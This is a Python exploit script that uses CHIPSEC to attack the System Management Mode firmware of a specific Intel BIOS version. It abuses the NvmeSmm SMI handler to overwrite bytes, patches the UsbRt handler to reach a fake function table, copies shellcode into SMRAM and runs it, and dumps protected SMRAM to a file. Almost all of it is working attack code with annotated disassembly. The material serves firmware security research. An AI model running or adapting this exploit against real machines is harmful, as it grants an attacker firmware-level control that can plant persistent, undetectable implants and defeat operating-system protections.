import sys, os, random
from struct import pack, unpack
from hexdump import hexdump

SMRAM_SIZE = 0x400000
SMRAM_ADDR = 0x8B400000

EBDA_ADDR = 0x040E

# NvmeSmm SW SMI handler number
NVME_SMI_NUM = 0x42

# UsbRt SW SMI handler number
USBRT_SMI_NUM = 0x31        

# which BIOS version to exploit
BIOS_VER = 0

BIOS_VERSIONS = [

    # version name           address of memcpy()   address of instruction to patch
    ( 'SYSKLi35.86A.0045',   0x8B702110,           0x8B6EDF4D )
]

BIOS_VER, MEMCPY_ADDR, PATCH_INSN_ADDR = BIOS_VERSIONS[BIOS_VER]

PATCH_INSN_LEN = 7

align_up = lambda a, b: a + (b - (a % b))

class Chipsec(object):

    def __init__(self):

        import chipsec.chipset
        import chipsec.hal.physmem
        import chipsec.hal.interrupts

        # initialize CHIPSEC
        self.cs = chipsec.chipset.cs()
        self.cs.init(None, True)

        # get instances of required classes
        self.mem = chipsec.hal.physmem.Memory(self.cs)
        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)

    # CHIPSEC has no physical memory read/write methods for quad words
    def read_physical_mem_qword(self, addr):

        return unpack('Q', self.mem.read_physical_mem(addr, 8))[0]

    def write_physical_mem_qword(self, addr, val):

        self.mem.write_physical_mem(addr, 8, pack('Q', val))

    def mem_alloc(self, data, size = None):

        if not isinstance(data, basestring):

            size = data
            data = None

        if size is None:

            size = align_up(len(data), 0x100)

        _, addr = self.mem.alloc_physical_mem(size)
        self.mem.write_physical_mem(addr, size, '\0' * size)

        if data is not None:

            self.mem.write_physical_mem(addr, len(data), data)

        return addr

# initialize chipsec stuff
cs = Chipsec()

def overwrite_with_0x07(addr):

    addr -= 2

    # backup memory contents
    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)

    # overwrite EBDA word
    cs.mem.write_physical_mem_word(EBDA_ADDR, 0)

    addr_1 = (0 << 4) + 0x0104
    val_1 = cs.mem.read_physical_mem_dword(addr_1)

    # write pointer value
    cs.mem.write_physical_mem_dword(addr_1, addr)

    print('Trigerring SW SMI 0x%x to overwrite byte at 0x%x with 7...' % \
          (NVME_SMI_NUM, addr + 2))

    # fire SMI
    cs.ints.send_SW_SMI(0, NVME_SMI_NUM, 0, 0, 0, 0, 0, 0, 0)

    # restore overwritten memory
    cs.mem.write_physical_mem_dword(addr_1, val_1)
    cs.mem.write_physical_mem_word(EBDA_ADDR, val_0)

def smm_call(func_addr, func_args = None):        

    FUNC_TABLE = PATCH_INSN_ADDR + PATCH_INSN_LEN - (0xFFFFFFFF - 0xFF070707 + 1)
    FUNC_TABLE_SIZE = 7

    # internal function numbers for UsbRt SW SMI handler
    USBRT_PROC = 0x2E
    USBRT_SUB_PROC = 0x00        

    args = [] if func_args is None else func_args        
    args_addr = 0x00000500
    args_len = len(args)

    print('Target "lea reg, func_table" instruction to patch is at 0x%.8x' % \
          PATCH_INSN_ADDR)

    # patch function table offset from 0xFFFFxxxx to 0xFF070707
    overwrite_with_0x07(PATCH_INSN_ADDR + 3)
    overwrite_with_0x07(PATCH_INSN_ADDR + 4)
    overwrite_with_0x07(PATCH_INSN_ADDR + 5)

    # backup memory contents
    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)   
    val_1 = cs.mem.read_physical_mem(FUNC_TABLE, 8 * FUNC_TABLE_SIZE)        
    val_2 = cs.mem.read_physical_mem(args_addr, 8 * args_len)

    '''

        USB API child function code:

            seg000:000000008B6E7F38                 push    rbx
            seg000:000000008B6E7F3A                 sub     rsp, 20h
            seg000:000000008B6E7F3E                 mov     r8d, [rcx+0Bh]
            seg000:000000008B6E7F42                 mov     rbx, rcx
            seg000:000000008B6E7F45                 movzx   ecx, byte ptr [rcx+1]
            seg000:000000008B6E7F49                 mov     rdx, [rbx+3]
            seg000:000000008B6E7F4D                 lea     rax, off_8B6E5F28 ; <== patch here!
            seg000:000000008B6E7F54                 add     r8d, 3
            seg000:000000008B6E7F58                 mov     rcx, [rax+rcx*8] ; get function address to call
            seg000:000000008B6E7F5C                 and     r8d, 0FFFFFFFCh
            seg000:000000008B6E7F60                 call    sub_8B6E7DD0
            seg000:000000008B6E7F65                 mov     byte ptr [rbx+2], 0
            seg000:000000008B6E7F69                 mov     [rbx+0Fh], rax
            seg000:000000008B6E7F6D                 add     rsp, 20h
            seg000:000000008B6E7F71                 pop     rbx
            seg000:000000008B6E7F72                 retn

    '''
    # SMM handler communication structure with input data
    data = pack('=BBBQIQ', USBRT_PROC, USBRT_SUB_PROC, 0xFF, args_addr, 8 * args_len, 0)

    '''

        UsbRt SW SMI handler code:

            seg000:000000008B6E6B7C sub_8B6E6B7C    proc near
            seg000:000000008B6E6B7C                 sub     rsp, 28h
            seg000:000000008B6E6B80                 mov     rax, cs:qword_8B6FC4F8
            seg000:000000008B6E6B87                 mov     rcx, [rax+6D78h]
            seg000:000000008B6E6B8E                 test    rcx, rcx
            seg000:000000008B6E6B91                 jz      short loc_8B6E6B9D
            seg000:000000008B6E6B93                 and     qword ptr [rax+6D78h], 0
            seg000:000000008B6E6B9B                 jmp     short loc_8B6E6BAF
            seg000:000000008B6E6B9D
            seg000:000000008B6E6B9D loc_8B6E6B9D:
            seg000:000000008B6E6B9D                 ; get communication buffer address
            seg000:000000008B6E6B9D                 movzx   eax, word ptr ds:40Eh
            seg000:000000008B6E6BA5                 shl     eax, 4
            seg000:000000008B6E6BA8                 add     eax, 104h ; EBDA address
            seg000:000000008B6E6BAD                 mov     ecx, [rax]
            seg000:000000008B6E6BAF
            seg000:000000008B6E6BAF loc_8B6E6BAF:
            seg000:000000008B6E6BAF                 test    rcx, rcx
            seg000:000000008B6E6BB2                 jnz     short loc_8B6E6BC0
            seg000:000000008B6E6BB4                 mov     rax, 8000000000000009h
            seg000:000000008B6E6BBE                 jmp     short loc_8B6E6BC7
            seg000:000000008B6E6BC0
            seg000:000000008B6E6BC0 loc_8B6E6BC0:
            seg000:000000008B6E6BC0                 ; call USB API child function by given index
            seg000:000000008B6E6BC0                 call    sub_8B6E6888
            seg000:000000008B6E6BC5                 xor     eax, eax
            seg000:000000008B6E6BC7
            seg000:000000008B6E6BC7 loc_8B6E6BC7:
            seg000:000000008B6E6BC7                 add     rsp, 28h
            seg000:000000008B6E6BCB                 retn
            seg000:000000008B6E6BCB sub_8B6E6B7C    endp

    '''
    addr_1 = (0x10 << 4) + 0x0104
    data_1 = cs.mem.read_physical_mem_dword(addr_1)

    addr_2 = 0x00000300
    data_2 = cs.mem.read_physical_mem(addr_2, 0x20)

    print('%d function arguments are at 0x%.8x' % (args_len, args_addr))
    print('Fake functions table address is 0x%.8x' % FUNC_TABLE)
    print('SMM communication buffer address is at 0x%.8x' % addr_1)
    print('SMM communication buffer is at 0x%.8x' % addr_2)

    # write usb communication strucutre
    cs.mem.write_physical_mem(addr_2, len(data_2), '\0' * len(data_2))
    cs.mem.write_physical_mem(addr_2, len(data), data)

    # write usb communication strucutre address
    cs.mem.write_physical_mem_dword(addr_1, addr_2)

    # write function arguments
    for i in range(0, len(args)):

        cs.write_physical_mem_qword(args_addr + (8 * i), args[i])

    # write fake functions table
    for i in range(0, FUNC_TABLE_SIZE):

        cs.write_physical_mem_qword(FUNC_TABLE + (8 * i), func_addr)

    # overwrite EBDA word
    cs.mem.write_physical_mem_word(EBDA_ADDR, 0x10)                

    print('Triggering SW SMI 0x%x...' % USBRT_SMI_NUM)        

    # fire SMI
    cs.ints.send_SW_SMI(0, USBRT_SMI_NUM, 0, 0, 0, 0, 0, 0, 0)     

    # check for status code returned by SW SMI handler
    val_3 = cs.mem.read_physical_mem_byte(addr_2 + 3)
    val_4 = cs.read_physical_mem_qword(addr_2 + 0xf)
    assert val_3 == 0

    # restore overwritten memory        
    cs.mem.write_physical_mem(addr_2, len(data_2), data_2)     
    cs.mem.write_physical_mem_dword(addr_1, data_1)        

    cs.mem.write_physical_mem(args_addr, len(val_2), val_2)     
    cs.mem.write_physical_mem(FUNC_TABLE, len(val_1), val_1)
    cs.mem.write_physical_mem_word(EBDA_ADDR, val_0) 

    print('SUCESS: SMM function 0x%.8x was called' % func_addr)

    return val_4      

smm_memcpy = lambda src, dst, size: smm_call(MEMCPY_ADDR, [ src, dst, size ])  

def execute_shellcode(code, args):

    addr = SMRAM_ADDR + 0x1000
    code = ''.join(code) if isinstance(code, list) else code    

    # align shellcode size by 0x100
    size = align_up(len(code), 0x100)
    code = code + '\0' * (size - len(code))

    # allocate temporary destination buffer for memcpy() call
    _, buff_addr = cs.mem.alloc_physical_mem(size)
    cs.mem.write_physical_mem(buff_addr, size, code)

    print('Copying %d bytes of the shellcode from 0x%.8x to 0x%.8x' % \
          (size, buff_addr, addr))

    # copy shellcode into SMRAM
    smm_memcpy(addr, buff_addr, size)

    print('Executing shellcode...')

    # call the shellcode
    return smm_call(addr, args)    

def dump_smram():

    # allocate temporary destination buffer for memcpy() call
    buff_addr = cs.mem_alloc('foobar', SMRAM_SIZE)
    
    print('Physical memory for temporary read buffer allocated at 0x%.8x' % buff_addr)

    # perform copy memory operation in SMM
    smm_memcpy(buff_addr, SMRAM_ADDR, SMRAM_SIZE)

    data = cs.mem.read_physical_mem(buff_addr, SMRAM_SIZE)

    # check if memcpy() to our buffer was actually happened
    if data[:6] == 'foobar':

        raise('Unable to read memory, it seems that memcpy() wasn\'t called')

    return data

def get_protocol_addr(data, target_guid):

    in_smram = lambda addr: addr >= SMRAM_ADDR and \
                            addr <  SMRAM_ADDR + SMRAM_SIZE

    to_offset = lambda addr: addr - SMRAM_ADDR
    from_offset = lambda offs: offs + SMRAM_ADDR

    get_data = lambda offs, size: data[offs : offs + size]

    ptr = 0
    parse = lambda offs: unpack('QQ16sQ', get_data(offs, 0x28))

    while ptr < SMRAM_SIZE - 0x100:

        # check for 'prte' signature
        if get_data(ptr, 4) == 'prte':

            flink, blink, guid, info = parse(ptr + 8)

            # check for valid protocol structure
            if in_smram(flink) and in_smram(blink) and in_smram(info) and \
               guid == target_guid:

                # get protocol information
                offs = to_offset(info)
                tmp_1, tmp_2, tmp_3, addr = unpack('QQQQ', get_data(offs, 0x20))

                if in_smram(tmp_1) and in_smram(tmp_2) and \
                   in_smram(tmp_3) and in_smram(addr):

                    return addr

                assert False

        ptr += 8

    return None

def main():

    global cs

    print('Selected BIOS version is %s' % BIOS_VER)    

    if len(sys.argv) < 2:    

        code = [ '\x48\x89\xC8',    # mov    rax, rcx
                 '\x48\x01\xD0',    # add    rax, rdx
                 '\xC3' ]           # ret

        a, b = int(random.random() * 0x100000), \
               int(random.random() * 0x100000)

        # execute shellcode that adds two numbers
        ret = execute_shellcode(code, [ a, b ])

        # check for correct addition result
        assert ret == a + b

    else:

        dump_addr = int(sys.argv[1], 16)
        dump_size = int(sys.argv[2], 16) if len(sys.argv) >= 3 else 0x1000

        print('Dump address is 0x%.8x:%.8x' % (dump_addr, dump_addr + dump_size - 1))    

        # allocate temporary destination buffer for memcpy() call
        buff_addr = cs.mem_alloc('foobar', dump_size)
        
        print('Physical memory for temporary read buffer allocated at 0x%.8x' % buff_addr)
        print('SMM memcpy() address is 0x%.8x' % MEMCPY_ADDR)

        # perform copy memory operation in SMM
        smm_memcpy(buff_addr, dump_addr, dump_size)

        data = cs.mem.read_physical_mem(buff_addr, dump_size)

        # check if memcpy() to our buffer was actually happened
        if data[:6] == 'foobar':

            raise('Unable to read memory, it seems that memcpy() wasn\'t called')

        if len(sys.argv) >= 4:

            dest_file = sys.argv[3]

            print('Writing 0x%x bytes of readed memory into the %s' % (dump_size, dest_file))

            with open(dest_file, 'wb') as fd:

                fd.write(data)

        else:

            print('Dumped memory contents:\n')

            hexdump(data)

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
